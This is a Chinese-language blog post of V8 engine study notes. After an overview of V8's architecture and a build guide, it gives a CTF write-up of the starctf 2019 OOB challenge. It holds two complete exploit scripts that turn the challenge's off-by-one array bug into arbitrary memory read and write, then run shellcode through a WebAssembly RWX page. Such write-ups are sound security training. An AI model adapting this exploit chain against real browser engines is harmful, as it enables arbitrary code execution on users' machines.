<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>v8 学习记录</title><meta name="description" content="Being Honest With Yourself"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
基础知识v8是chrome浏览器的 JavaScript 引擎，是著名的 JIT(Just In Time) 引擎。在Chromium项目中起到至关重要的作用。作为一款jit引擎，其工作模式如下图所示：


Interpreter 负责从 Javascript AST 生成 bytecodes，同时也可以基于bytecode直接生成机器代码。在 V8 中该组件名为Ignition。
JIT Complier: Turbofan作为 V8 中的优化器，其作用是将字节码优化成为固定的机器代码。在优化过程中，V8 引入了SSA(静态单赋值)形式的中间代码简化编译器的优化算法，在其若干优化过程（PASS）中实现安全的 JIT 代码生成。
Runtime：提供各种数据结构的实现以及buildin函数等等。
GC：V.."><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Q1IQ's blog" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Q1IQ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">v8 学习记录</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ignition"><span class="toc-text">Ignition</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Turbofan"><span class="toc-text">Turbofan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Runtime"><span class="toc-text">Runtime</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#starctf-2019-OOB"><span class="toc-text">starctf 2019 OOB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/PWN"><i class="tag post-item-tag">PWN</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">v8 学习记录</h1><time class="has-text-grey" datetime="2022-04-29T05:59:34.000Z">2022-04-29</time><article class="mt-2 post-content"><p><img src="/images/aniya.jpg" alt="cover"></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>v8是chrome浏览器的 JavaScript 引擎，是著名的 JIT(Just In Time) 引擎。在Chromium项目中起到至关重要的作用。作为一款jit引擎，其工作模式如下图所示：</p>
<p><img src="/img/image-20220601144046089.png" alt="image-20220601144046089"></p>
<ol>
<li>Interpreter 负责从 Javascript AST 生成 bytecodes，同时也可以基于bytecode直接生成机器代码。在 V8 中该组件名为Ignition。</li>
<li>JIT Complier: Turbofan作为 V8 中的优化器，其作用是将字节码优化成为固定的机器代码。在优化过程中，V8 引入了SSA(静态单赋值)形式的中间代码简化编译器的优化算法，在其若干优化过程（PASS）中实现安全的 JIT 代码生成。</li>
<li>Runtime：提供各种数据结构的实现以及buildin函数等等。</li>
<li>GC：V8的垃圾回收器。</li>
</ol>
<h3 id="Ignition"><a href="#Ignition" class="headerlink" title="Ignition"></a>Ignition</h3><p>位于<code>src/interpreter/bytecode-generator.h</code>中的 <code>BytecodeGenerator</code>实现了<code>AstVisitor</code>，将在遍历<code>Javascript AST</code>中创建相应的字节码。字节码的生成方法为是<code>BytecodeGenerator::GenerateBytecode</code> 。</p>
<p>针对单个字节码来说，v8 实现了<code> Ignition_handler</code> 可以遍历前面生成的bytecodes, 例如：</p>
<p><img src="/img/20201023192911.png"></p>
<p>值得一提的是，以上<code>Ignition_handler</code>中采用了<code>CSA(CodeStubAssembler)</code>，这是一种类似于汇编的语言，保持了platform-independent的同时也具备一定的可读性。这样，Ignition顺序执行字节码对应的handler的过程看起来就像这样：</p>
<p><img src="/img/20201023193018.png"></p>
<p>总的来说，可以把Ignition当作一个解释器或者低级的翻译器，字节码可以在调试v8的时候通过—print-bytecode打印。</p>
<h3 id="Turbofan"><a href="#Turbofan" class="headerlink" title="Turbofan"></a>Turbofan</h3><p>Turbofan是整个v8最为核心最为复杂的部分。优化过程中采用了基于sea of node思想设计的中间语言。这是一种Program Dependence Graph，其宗旨是“在统一的表达形式下，把分析进行彻底”。用这样的IR所表达的程序是由经过完全的程序分析后产生的节点组成，这种节点可以依赖别的节点，本身也可以被别的节点依赖。各种 IR 操作并不操作变量，而是代表从依赖获取输入节点，经运算后产生新的节点这样的行为。这样，Turbofan 针对每个节点的优化变得相对独立，因为其自身会携带足够依赖信息来判明它在怎样的路径上有效，依赖的数据输入是哪些。例如对于<code>obj[x] = obj[x] + 1</code>来说，对应的IR为：</p>
<p><img src="/img/20201023194649.png"></p>
<p>该图表明了一种依赖关系：load-&gt;add-&gt;store</p>
<p>其次，由于Javascript为弱类型语言，而JIT代码往往是针对某种类型特定优化的，错误的类型很可能会导致安全问题。因此为了提高安全性，Turbofan在JIT代码中会插入类型检查，其工作模式如下图</p>
<p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20201023195737.png"></p>
<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>Tagged Value：</p>
<p><img src="/img/20201023202653.png"></p>
<ul>
<li>最低位是LSB标志位</li>
<li>SMI: SMall Integer，将最后一bit清零，访问的时候当作SMI</li>
<li>HeapObject：最后一位置1，访问的时候减去1然后取内存中的值再来访问</li>
<li>可以理解为存储了简单的数据类型，更复杂的数据类型信息存储在map</li>
</ul>
<p>Map存储了：</p>
<ul>
<li>对象的动态类型</li>
<li>对象的大小(以字节为单位)</li>
<li>对象的属性及其存储位置</li>
<li>数组元素的类型</li>
<li>对象的原型</li>
</ul>
<p>Map提供属性值在存储区域中的确切位置位于object的头部，属性值的存储区域有三个：inline，out-of-line，element（数组访问）。<br>例如：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20201023203002.png"><br>下划线部分为map指针，绿色部分代表对象创建时就有的属性，会被直接放置在Object o的内部，蓝色部分作为数组属性所指的内存空间存储了数组元素的具体值，红色部分作为后续添加的属性指向了额外的存储属性值的内存。</p>
<p>V8的object类型访问完全依靠上述的结构实现，给了我们攻击思路：倘若控制了对象的map值就可以实现错误的元素访问。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>安装depot_tools</p>
<pre><code>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
echo &#39;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&#39; &gt;&gt; ~/.bashrc</code></pre>
<p>安装ninja</p>
<pre><code>git clone https://github.com/ninja-build/ninja.git
cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..
echo &#39;export PATH=$PATH:&quot;/path/to/ninja&quot;&#39; &gt;&gt; ~/.bashrc</code></pre>
<p>下载编译v8</p>
<pre><code>fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync
tools/dev/v8gen.py x64.debug
ninja -C out/x64.debug</code></pre>
<p>运行</p>
<pre><code>./out/x64.debug/d8
./out/x64.debug/shell</code></pre>
<p>调试脚本</p>
<pre><code>cp /home/q1iq/Documents/v8/tools/gdbinit /home/q1iq/env/gdbinit_v8
vim ~/.gdbinit 
填入 source /home/q1iq/env/gdbinit_v8</code></pre>
<p>调试选项 <code>--allow-natives-syntax</code></p>
<pre><code>%SystemBreak();
%DebugPrint(obj);</code></pre>
<h2 id="starctf-2019-OOB"><a href="#starctf-2019-OOB" class="headerlink" title="starctf 2019 OOB"></a>starctf 2019 OOB</h2><p>下载题目、编译：</p>
<pre><code>git clone https://github.com/sixstars/starctf2019.git
cd v8
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
git apply ../starctf2019/pwn-OOB/oob.diff
gclient sync -D
gn gen out/x64_startctf.release --args=&#39;v8_monolithic=true v8_use_external_startup_data=false is_component_build=false is_debug=false target_cpu=&quot;x64&quot; use_goma=false goma_dir=&quot;None&quot; v8_enable_backtrace=true v8_enable_disassembler=true v8_enable_object_print=true v8_enable_verify_heap=true&#39;
ninja -C out/x64_startctf.release d8</code></pre>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目给了diff文件，为Array增加了一个oob函数，实现为ArrayOob，当调用这个函数的参数的个数为1时，可以读Array的第length个成员，个数为2时，将参数1赋值给Array的第length个成员。这里ArrayOob是C++实现的成员函数，第一个参数是this指针，后面的才是js传入的参数。</p>
<p>因此定位到漏洞是Array对象的off by one的越界读写。</p>
<pre><code>--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 &#125;
 &#125;  // namespace
+BUILTIN(ArrayOob)&#123;
+    uint32_t len = args.length();
+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle&lt;JSReceiver&gt; receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
+    if(len == 1)&#123;
+        //read
+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
+    &#125;else&#123;
+        //write
+        Handle&lt;Object&gt; value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+        elements.set(length,value-&gt;Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    &#125;
+&#125;</code></pre>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>基本原理是对象数组和浮点数数组类型混淆。</p>
<ol>
<li>用float array类型访问object array的elements，可以将object的地址以float类型读出，实现任意object的地址泄露；</li>
<li>用数组伪造fake float array的字段（exp里是array_box），泄露数组的地址计算偏移得到fake float array的地址，将这个地址转为float，用object array类型访问这个float将其混淆为object得到fake float array；</li>
<li>将fake  float array的elements字段指向任意地址，实现任意地址读写；</li>
<li>最后wasm一把梭弹计算器。具体是首先加载一段wasm代码到内存中，再泄露存放wasm编译后的汇编的内存地址，通过任意地址写原语用shellcode替换原本wasm的代码内容，最后调用wasm的函数接口触发调用shellcode。</li>
</ol>
<p>完整exp：</p>
<pre><code>//fulfill
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() &#123;
    return &#39;0x&#39; + this.toString(16);
&#125;;
BigInt.prototype.i2f = function() &#123;
    int_view[0] = this;
    return float_view[0];
&#125;
BigInt.prototype.smi2f = function() &#123;
    int_view[0] = this &lt;&lt; 32n;
    return float_view[0];
&#125;
Number.prototype.f2i = function() &#123;
    float_view[0] = this;
    return int_view[0];
&#125;
Number.prototype.f2smi = function() &#123;
    float_view[0] = this;
    return int_view[0] &gt;&gt; 32n;
&#125;
Number.prototype.i2f = function() &#123;
    return BigInt(this).i2f();
&#125;
Number.prototype.smi2f = function() &#123;
    return BigInt(this).smi2f();
&#125;
function debug()&#123;
    console.log(&quot;debug...&quot;);
    readline();
&#125;
function gc()&#123;
    for(var i=0;i&lt;0x10;i++)&#123;
        new ArrayBuffer(0x1000000);
    &#125;
&#125;
function fail(str)&#123;
    console.log(&quot;FAIL:&quot;,str);
    throw null;
&#125;

//trigger patch
var float_arr = [1.1,2,3,4];
var obj_sample = &#123;&quot;what&quot;:&quot;ever&quot;&#125;;
var obj_arr = [obj_sample];
var float_arr_map=float_arr.oob();
var obj_arr_map=obj_arr.oob();

function obj_to_float(o)
&#123;
    obj_arr[0] = o;
    obj_arr.oob(float_arr_map);
    var num = obj_arr[0];
    obj_arr.oob(obj_arr_map);
    return num;
&#125;

var array_box = [
    float_arr_map,   // fake obj  |map
    2,               //           |properties
    3,               //           |elements
    4,
    5,
    6,
    7,
    8,
    9,
    1.0,
    1.1,
    1.2,
    1.3,
    1.4,
    1.5,
    1.6
];

// leak addr of array_box
var array_box_addr = obj_to_float(array_box).f2i()-1n;
console.log(array_box_addr.hex());
//%DebugPrint(array_box);

// fake object
var fake_obj_addr = array_box_addr-0x80n;
float_arr[0] = (fake_obj_addr+1n).i2f();
float_arr.oob(obj_arr_map);
var fake_obj = float_arr[0];  //get a object whose addr is fakce_obj_addr
float_arr.oob(float_arr_map);

// Arbitrary address read 
function read64(leak_addr)&#123;
    array_box[2] =  (leak_addr - 0x10n + 0x1n).i2f();
    return fake_obj[0].f2i(); 
&#125;

// Arbitrary address write
function write64(addr,data)&#123;  //addr, data: BigInt
    array_box[2] =  (addr - 0x10n + 0x1n).i2f();
    fake_obj[0] = data.i2f();
&#125;

// wasm -&gt; shellcode
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, &#123;&#125;);
var f = wasm_instance.exports.main;
var f_addr = obj_to_float(f).f2i()-1n;
console.log(&quot;[*] leak wasm addr: &quot; + f_addr.hex());

var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
console.log(&quot;[*] leak rwx_page_addr: &quot; + rwx_page_addr.hex());

var shellcode =[0x010101010101b848n, 0x68632eb848500101n, 0x0431480169722e6fn, 0x0cfe016ae7894824n, 0x63782f6e69b84824n, 0x3b30b84850636c61n, 0x4850622f7273752fn, 0x303a3d59414c50b8n, 0x74726f70b848502en, 0x01b8485053494420n, 0x5001010101010101n, 0x01622c016972b848n, 0xf631240431487964n, 0x56e601485e0e6a56n, 0x6a56e601485e136an, 0x894856e601485e18n, 0x050f583b6ad231e6n]

var data_buf = new ArrayBuffer(0xa0);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = obj_to_float(data_buf).f2i()-1n + 0x20n;
write64(buf_backing_store_addr, rwx_page_addr);  
for (var i = 0; i &lt; shellcode.length; i++) &#123;
    data_view.setFloat64(i*8, shellcode[i].i2f(), true);
&#125;
f();</code></pre>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>基本原理是Object和Array的类型混淆。</p>
<p>构建如下obj1,obj2，用obj1的类型访问obj2.a，就可以达到覆写obj2原本的size位的效果，将size位写成一个很大的值就可以实现一定距离数组越界读写。在obj2下方构建一个float array，修改float array的elements，即可实现任意地址写。最后wasm一把梭。</p>
<pre><code>var obj1 = &#123;a:1,b:2&#125;;
var obj2 = new Array(10);</code></pre>
<p>obj1内存布局如下：</p>
<p><img src="/img/image-20220527233721754.png" alt="image-20220527233721754"></p>
<p>obj2内存布局如下：</p>
<p><img src="/img/image-20220527233750007.png" alt="image-20220527233750007"></p>
<p>另外这里和法一有点区别的是，用<code> new Array(10);</code>分配数组时，jsArray在FixedArray上方，<code>var float_arr = [1.1,2,3,4];</code>这样分配时，jsArray在FixedArray下方。</p>
<p>完整exp：</p>
<pre><code>//fulfill
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() &#123;
    return &#39;0x&#39; + this.toString(16);
&#125;;
BigInt.prototype.i2f = function() &#123;
    int_view[0] = this;
    return float_view[0];
&#125;
BigInt.prototype.smi2f = function() &#123;
    int_view[0] = this &lt;&lt; 32n;
    return float_view[0];
&#125;
Number.prototype.f2i = function() &#123;
    float_view[0] = this;
    return int_view[0];
&#125;
Number.prototype.f2smi = function() &#123;
    float_view[0] = this;
    return int_view[0] &gt;&gt; 32n;
&#125;
Number.prototype.i2f = function() &#123;
    return BigInt(this).i2f();
&#125;
Number.prototype.smi2f = function() &#123;
    return BigInt(this).smi2f();
&#125;
function debug()&#123;
    console.log(&quot;debug...&quot;);
    readline();
&#125;
function gc()&#123;
    for(var i=0;i&lt;0x10;i++)&#123;
        new ArrayBuffer(0x1000000);
    &#125;
&#125;
function fail(str)&#123;
    console.log(&quot;FAIL:&quot;,str);
    throw null;
&#125;

//trigger patch
var array1 = new Array(10);
//%DebugPrint(array1);
var obj1 = &#123;a:1,b:2&#125;;

var array2 = new Array(10);
var obj2 = new Array(10);

var obj1_map=array1.oob();
var obj2_map=array2.oob();
//%DebugPrint(obj1);
//%DebugPrint(obj2);

array2.oob(obj1_map);
obj2.a=0x100;   //obj2.size
array2.oob(obj2_map);

obj2[0]=1.1; //make obj2 a float array
var exp_array = new Array(10);
exp_array[0]=1.1; //make exp a float array
exp_array[1]=1.2;
leak_exp_addr=obj2[19].f2i()-0x1n;   //elements of exp 
//%DebugPrint(exp);
console.log(&quot;[*] leak_exp_addr: &quot;,leak_exp_addr.hex());

function read64(leak_addr) &#123;
    //%SystemBreak();
    obj2[19]=(leak_addr+1n-0x10n).i2f();
    //%SystemBreak();
    return exp_array[0].f2i()
&#125;

function write64(addr,data)&#123;
    obj2[19]=(addr+1n-0x10n).i2f();
    exp_array[0]=data.i2f();
&#125;

// wasm -&gt; shellcode
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, &#123;&#125;);
var f = wasm_instance.exports.main;
//%DebugPrint(f);
array1[0] = f;
console.log(&quot;[*] leak wasm addr in : &quot; + (leak_exp_addr-0x358n).hex());
var f_addr = read64(leak_exp_addr-0x358n)-0x1n;
console.log(&quot;[*] leak wasm addr: &quot; + f_addr.hex());
//%SystemBreak();
var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
console.log(&quot;[*] leak rwx_page_addr: &quot; + rwx_page_addr.hex());

var shellcode =[0x010101010101b848n, 0x68632eb848500101n, 0x0431480169722e6fn, 0x0cfe016ae7894824n, 0x63782f6e69b84824n, 0x3b30b84850636c61n, 0x4850622f7273752fn, 0x303a3d59414c50b8n, 0x74726f70b848502en, 0x01b8485053494420n, 0x5001010101010101n, 0x01622c016972b848n, 0xf631240431487964n, 0x56e601485e0e6a56n, 0x6a56e601485e136an, 0x894856e601485e18n, 0x050f583b6ad231e6n]

var data_buf = new ArrayBuffer(0xa0);
var data_view = new DataView(data_buf);
array1[0] = data_buf;
var buf_backing_store_addr = read64(leak_exp_addr-0x358n)-0x1n + 0x20n;
write64(buf_backing_store_addr, rwx_page_addr);  
for (var i = 0; i &lt; shellcode.length; i++) &#123;
    data_view.setFloat64(i*8, shellcode[i].i2f(), true);
&#125;
f();</code></pre>
<p>不过我调试这种方法的时候发现，每次运行read64时都会卡在<code>Builtins_StoreFastElementIC_Standard+4889</code>，一直c可以c到shellcode，但是在终端直接跑脚本会报<code>Trace/breakpoint trap</code>，没排查出错误原因是什么，挖个坑以后填吧。</p>
<p><img src="/img/image-20220528030619137.png" alt="image-20220528030619137"></p>
<p><img src="/img/image-20220528032358401.png" alt="image-20220528032358401"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1822/">https://paper.seebug.org/1822/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/Linux-eBPF-exploit/" title="Linux eBPF模块漏洞利用学习记录"><span class="has-text-weight-semibold">Next: Linux eBPF模块漏洞利用学习记录</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Q1IQ" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/Q1iqF"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Q1IQ"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Q1IQ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>